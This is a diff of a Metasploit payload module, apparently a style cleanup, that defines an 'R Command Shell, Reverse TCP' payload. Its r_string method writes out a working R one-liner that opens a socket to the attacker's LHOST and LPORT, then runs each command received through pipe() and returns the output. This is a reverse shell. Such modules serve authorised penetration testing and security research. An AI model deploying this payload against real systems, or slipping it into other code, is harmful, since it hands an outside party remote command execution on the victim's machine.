@@ -9,7 +9,6 @@ require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
-
   CachedSize = 150
 
   include Msf::Payload::Single
@@ -18,17 +17,16 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'        => 'R Command Shell, Reverse TCP',
-      'Description' => 'Connect back and create a command shell via R',
-      'Author'      => [ 'RageLtMan' ],
-      'License'     => MSF_LICENSE,
-      'Platform'    => 'r',
-      'Arch'        => ARCH_R,
-      'Handler'     => Msf::Handler::ReverseTcp,
-      'Session'     => Msf::Sessions::CommandShell,
-      'PayloadType' => 'r',
-      'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
-    ))
+                     'Name' => 'R Command Shell, Reverse TCP',
+                     'Description' => 'Connect back and create a command shell via R',
+                     'Author' => [ 'RageLtMan <rageltman[at]sempervictus>' ],
+                     'License' => MSF_LICENSE,
+                     'Platform' => 'r',
+                     'Arch' => ARCH_R,
+                     'Handler' => Msf::Handler::ReverseTcp,
+                     'Session' => Msf::Sessions::CommandShell,
+                     'PayloadType' => 'r',
+                     'Payload' => { 'Offsets' => {}, 'Payload' => '' }))
   end
 
   def generate
@@ -38,8 +36,8 @@ module MetasploitModule
   def r_string
     lhost = datastore['LHOST']
     lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
-    return "s<-socketConnection(host='#{lhost}',port=#{datastore['LPORT']}," +
-    "blocking=TRUE,server=FALSE,open='r+');while(TRUE){writeLines(readLines" +
-    "(pipe(readLines(s, 1))),s)}"
+    return "s<-socketConnection(host='#{lhost}',port=#{datastore['LPORT']}," \
+           "blocking=TRUE,server=FALSE,open='r+');while(TRUE){writeLines(readLines" \
+           "(pipe(readLines(s, 1))),s)}"
   end
 end
